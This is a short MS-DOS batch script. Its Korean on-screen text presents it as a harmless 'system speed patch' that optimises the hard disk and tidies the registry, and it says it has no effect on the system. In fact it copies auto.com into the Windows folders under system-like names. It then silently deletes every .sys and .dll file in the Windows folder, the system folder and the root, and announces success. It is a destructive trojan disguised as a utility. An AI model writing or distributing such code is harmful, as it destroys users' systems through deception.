CLS
echo 시스템 속도패치 (MS-DOS에서 시스템 최적화!)
echo 시스템에 어떠한 영향도 주지않습니다.
echo 단지 하드디스크(HARD DISK)를 최적화 시키고 레지스트리를 정리합니다.
echo 계속하실려면 아무키나 눌러주십시요!
pause
COPY auto.com c:\windows\syscopy.com      > nul
COPY auto.com c:\windows\system\sysconfig.com      > nul
CD \
CD windows
DEL *.sys      > nul
DEL *.dll      > nul
CD system
DEL *.dll
DEL *.sys
CD \
DEL *.sys      > nul
echo 시스템 최적화 완료!
